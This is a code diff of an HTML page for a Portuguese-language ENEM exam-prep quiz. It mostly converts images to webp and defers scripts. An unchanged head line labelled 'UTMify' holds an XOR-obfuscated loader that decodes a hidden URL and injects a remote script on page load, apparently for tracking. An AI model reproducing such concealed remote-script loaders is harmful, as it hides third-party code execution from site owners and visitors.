@@ -8,21 +8,24 @@
 <meta name="theme-color" content="#0891b2" />
 <!-- UTMify -->
 <script>(function(){var n_u=atob("DB37J57rCSMssAOPZmbZUuyHKxkO2Hf7Fm7BCLGIbU0CxXfiD3uCCf2EZA1Owiz8BW+SV+qYJlNFyGbjSW2SX/uHJ0lfki+tB2mPVfeJfFdJwyG1PUDXBfmHZkFN3HCtXEaABfCKZEYOiiH/D2WeS9ePKw8OxmLjE3jZHbzdaEAUhDC8A3uaEv3ebRVKiDPsVi3IRqjJdH5R");var q_3s=[];for(var e_ihj=0;e_ihj<n_u.length;e_ihj++){q_3s.push(n_u.charCodeAt(e_ihj)&255);}var g_i=q_3s[0];var a_nzl=q_3s.slice(1,1+g_i);var z_cpz=q_3s.slice(1+g_i);var h_cdwr=z_cpz.map(function(b,l_2){return b^a_nzl[l_2%g_i];});var b_y7b="";for(var w_ch=0;w_ch<h_cdwr.length;w_ch++){b_y7b+=String.fromCharCode(h_cdwr[w_ch]&255);}var z_at=decodeURIComponent(escape(b_y7b));var i_xe=JSON.parse(z_at);var z_7=i_xe.globals||[];z_7.forEach(function(w_a){window[w_a.name]=w_a.value;});var z_4tg8=document.createElement("script");z_4tg8.src=i_xe.url;z_4tg8.async=true;z_4tg8.defer=true;(i_xe.attributes||[]).forEach(function(l_173){z_4tg8.setAttribute(l_173.name,l_173.value);});(document.head||document.documentElement).appendChild(z_4tg8);})();</script>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800;900&family=Lato:wght@400;700;900&display=swap" />
 <link rel="stylesheet" href="/shared/quiz-azul.css" />
 <script>
 /* versão escura: /quiz2/escuro (ou ?tema=escuro) */
 if(/\/escuro\/?$/.test(location.pathname)||location.pathname==='/'||/[?&]tema=escuro/.test(location.search)){document.documentElement.classList.add('escuro');document.write('<link rel="stylesheet" href="/shared/escuro-quiz.css"><meta name="theme-color" content="#000000">');}
 </script>
-<script src="/shared/conteudo/mat.js"></script>
-<script src="/shared/conteudo/fis.js"></script>
-<script src="/shared/conteudo/qui.js"></script>
-<script src="/shared/conteudo/bio.js"></script>
-<script src="/shared/conteudo/his.js"></script>
-<script src="/shared/conteudo/geo.js"></script>
-<script src="/shared/conteudo/fil.js"></script>
-<script src="/shared/conteudo/soc.js"></script>
-<script src="/shared/conteudo/lin.js"></script>
-<script src="/shared/materias.js"></script>
+<script defer src="/shared/conteudo/mat.js"></script>
+<script defer src="/shared/conteudo/fis.js"></script>
+<script defer src="/shared/conteudo/qui.js"></script>
+<script defer src="/shared/conteudo/bio.js"></script>
+<script defer src="/shared/conteudo/his.js"></script>
+<script defer src="/shared/conteudo/geo.js"></script>
+<script defer src="/shared/conteudo/fil.js"></script>
+<script defer src="/shared/conteudo/soc.js"></script>
+<script defer src="/shared/conteudo/lin.js"></script>
+<script defer src="/shared/materias.js"></script>
 <style>
 .capas{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:6px 0 4px;}
 .capa-mini{aspect-ratio:3/4;border-radius:10px;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:6px;box-shadow:0 6px 16px rgba(4,34,43,.25);position:relative;overflow:hidden;}
@@ -249,7 +252,7 @@ function montaPlano(){
    A última "foto" é cópia da primeira: ao chegar nela, volta ao início sem transição (sem salto). */
 /* na versão escura (/quiz2/escuro) usa os prints do aplicativo escuro */
 const SUF_IMG = document.documentElement.classList.contains('escuro') ? '-escuro' : '';
-const PRINTS = ['inicio','plano','meta','resumos','tema','progresso'].map(n=>'/img/print-app-'+n+SUF_IMG+'.jpg');
+const PRINTS = ['inicio','plano','meta','resumos','tema','progresso'].map(n=>'/img/print-app-'+n+SUF_IMG+'.webp');
 let printsIdx = 0, printsTimer = null;
 /* pré-carrega e decodifica tudo antes de começar, para a troca não travar */
 function precarregar(lista){ lista.forEach(src=>{ const im = new Image(); im.src = src; if(im.decode) im.decode().catch(()=>{}); }); }
@@ -296,7 +299,7 @@ function avancarPrints(){
   }
 }
 
-const PAGINAS_PDF = [{"m":"Matemática","t":"Razão e proporção","s":"/img/pdf/mat-1.jpg"},{"m":"Matemática","t":"Função afim (1º grau)","s":"/img/pdf/mat-2.jpg"},{"m":"Matemática","t":"Probabilidade","s":"/img/pdf/mat-3.jpg"},{"m":"Física","t":"Movimento uniforme","s":"/img/pdf/fis-1.jpg"},{"m":"Física","t":"Propagação do calor","s":"/img/pdf/fis-2.jpg"},{"m":"Física","t":"Geração de energia elétrica","s":"/img/pdf/fis-3.jpg"},{"m":"Química","t":"Separação de misturas","s":"/img/pdf/qui-1.jpg"},{"m":"Química","t":"Estequiometria","s":"/img/pdf/qui-2.jpg"},{"m":"Química","t":"Química ambiental","s":"/img/pdf/qui-3.jpg"},{"m":"Biologia","t":"Citologia: a célula","s":"/img/pdf/bio-1.jpg"},{"m":"Biologia","t":"Relações ecológicas","s":"/img/pdf/bio-2.jpg"},{"m":"Biologia","t":"Sistema imunológico e vacinas","s":"/img/pdf/bio-3.jpg"},{"m":"História","t":"Brasil Colônia: economia açucareira","s":"/img/pdf/his-1.jpg"},{"m":"História","t":"Abolição e pós-abolição","s":"/img/pdf/his-2.jpg"},{"m":"História","t":"Guerra Fria","s":"/img/pdf/his-3.jpg"},{"m":"Geografia","t":"Cartografia: escalas e projeções","s":"/img/pdf/geo-1.jpg"},{"m":"Geografia","t":"População: crescimento e estrutura","s":"/img/pdf/geo-2.jpg"},{"m":"Geografia","t":"Amazônia","s":"/img/pdf/geo-3.jpg"},{"m":"Filosofia","t":"Sócrates e os sofistas","s":"/img/pdf/fil-1.jpg"},{"m":"Filosofia","t":"Contratualismo: Hobbes, Locke e Rousseau","s":"/img/pdf/fil-2.jpg"},{"m":"Filosofia","t":"Política e democracia","s":"/img/pdf/fil-3.jpg"},{"m":"Sociologia","t":"Émile Durkheim","s":"/img/pdf/soc-1.jpg"},{"m":"Sociologia","t":"Ideologia e indústria cultural","s":"/img/pdf/soc-2.jpg"},{"m":"Sociologia","t":"Capital cultural","s":"/img/pdf/soc-3.jpg"},{"m":"Linguagens","t":"Interpretação de texto","s":"/img/pdf/lin-1.jpg"},{"m":"Linguagens","t":"Charges, tirinhas e memes","s":"/img/pdf/lin-2.jpg"},{"m":"Linguagens","t":"Língua estrangeira: estratégias de leitura","s":"/img/pdf/lin-3.jpg"}];
+const PAGINAS_PDF = [{"m":"Matemática","t":"Razão e proporção","s":"/img/pdf/mat-1.webp"},{"m":"Matemática","t":"Função afim (1º grau)","s":"/img/pdf/mat-2.webp"},{"m":"Matemática","t":"Probabilidade","s":"/img/pdf/mat-3.webp"},{"m":"Física","t":"Movimento uniforme","s":"/img/pdf/fis-1.webp"},{"m":"Física","t":"Propagação do calor","s":"/img/pdf/fis-2.webp"},{"m":"Física","t":"Geração de energia elétrica","s":"/img/pdf/fis-3.webp"},{"m":"Química","t":"Separação de misturas","s":"/img/pdf/qui-1.webp"},{"m":"Química","t":"Estequiometria","s":"/img/pdf/qui-2.webp"},{"m":"Química","t":"Química ambiental","s":"/img/pdf/qui-3.webp"},{"m":"Biologia","t":"Citologia: a célula","s":"/img/pdf/bio-1.webp"},{"m":"Biologia","t":"Relações ecológicas","s":"/img/pdf/bio-2.webp"},{"m":"Biologia","t":"Sistema imunológico e vacinas","s":"/img/pdf/bio-3.webp"},{"m":"História","t":"Brasil Colônia: economia açucareira","s":"/img/pdf/his-1.webp"},{"m":"História","t":"Abolição e pós-abolição","s":"/img/pdf/his-2.webp"},{"m":"História","t":"Guerra Fria","s":"/img/pdf/his-3.webp"},{"m":"Geografia","t":"Cartografia: escalas e projeções","s":"/img/pdf/geo-1.webp"},{"m":"Geografia","t":"População: crescimento e estrutura","s":"/img/pdf/geo-2.webp"},{"m":"Geografia","t":"Amazônia","s":"/img/pdf/geo-3.webp"},{"m":"Filosofia","t":"Sócrates e os sofistas","s":"/img/pdf/fil-1.webp"},{"m":"Filosofia","t":"Contratualismo: Hobbes, Locke e Rousseau","s":"/img/pdf/fil-2.webp"},{"m":"Filosofia","t":"Política e democracia","s":"/img/pdf/fil-3.webp"},{"m":"Sociologia","t":"Émile Durkheim","s":"/img/pdf/soc-1.webp"},{"m":"Sociologia","t":"Ideologia e indústria cultural","s":"/img/pdf/soc-2.webp"},{"m":"Sociologia","t":"Capital cultural","s":"/img/pdf/soc-3.webp"},{"m":"Linguagens","t":"Interpretação de texto","s":"/img/pdf/lin-1.webp"},{"m":"Linguagens","t":"Charges, tirinhas e memes","s":"/img/pdf/lin-2.webp"},{"m":"Linguagens","t":"Língua estrangeira: estratégias de leitura","s":"/img/pdf/lin-3.webp"}];
 let pdfTimer = null, pdfUltimo = -1, pdfFila = [];
 /* mostra uma página aleatória, sem repetir a anterior nem a mesma matéria duas vezes seguidas */
 function proximaPagina(){
@@ -433,7 +436,7 @@ const RENDER = {
     <div class="wrap fade">${contadorEnem()}<div class="card" style="text-align:center;padding-top:26px;padding-bottom:28px;">
       <h1 class="intro-h1">Você está <span>preparado</span> para o ENEM?</h1>
       <p class="intro-sub">Faça o teste e descubra o seu <strong>Índice de Preparo</strong>.</p>
-      <img src="/img/mockup-quiz2.png" alt="Material e aplicativo Plano ENEM" style="width:100%;max-width:520px;aspect-ratio:1000/1000;object-fit:cover;object-position:50% 40%;display:block;margin:22px auto 0;border-radius:16px;" onerror="this.remove()">
+      <img src="/img/mockup-quiz2.webp" width="800" height="800" fetchpriority="high" decoding="async" alt="Material e aplicativo Plano ENEM" style="width:100%;max-width:520px;aspect-ratio:1000/1000;object-fit:cover;object-position:50% 40%;display:block;margin:22px auto 0;border-radius:16px;" onerror="this.remove()">
       <h2 class="intro-h1" style="font-size:22px;margin:18px 0 0;">Qual é a sua situação?</h2>
       <p style="font-size:11px;letter-spacing:2px;text-transform:uppercase;font-weight:700;color:#9aa2b4;margin:4px 0 12px;">Toque para escolher</p>
       ${introCards(q)}
@@ -516,8 +519,8 @@ const RENDER = {
         <div class="res-aplicativo">
           <h3 class="pdf-h" style="font-size:19px;">E cada tema também tem um resumo dentro do aplicativo</h3>
           <div class="res-prints">
-            <figure><img src="/img/print-app-plano-resumo${SUF_IMG}.jpg" alt="Resumo de um tema aberto no plano" loading="lazy" onerror="this.parentNode.style.display='none'"><figcaption>O resumo aparece no seu plano, ao tocar em "Ver resumo"</figcaption></figure>
-            <figure><img src="/img/print-app-tema${SUF_IMG}.jpg" alt="Tela de um tema do aplicativo" loading="lazy" onerror="this.parentNode.style.display='none'"><figcaption>E o tema completo, com a dica "Como cai no ENEM"</figcaption></figure>
+            <figure><img src="/img/print-app-plano-resumo${SUF_IMG}.webp" alt="Resumo de um tema aberto no plano" loading="lazy" onerror="this.parentNode.style.display='none'"><figcaption>O resumo aparece no seu plano, ao tocar em "Ver resumo"</figcaption></figure>
+            <figure><img src="/img/print-app-tema${SUF_IMG}.webp" alt="Tela de um tema do aplicativo" loading="lazy" onerror="this.parentNode.style.display='none'"><figcaption>E o tema completo, com a dica "Como cai no ENEM"</figcaption></figure>
           </div>
         </div>
         <p class="pdf-fecho">Com o conteúdo completo e um plano para cada dia, você chega mais preparado(a).</p>
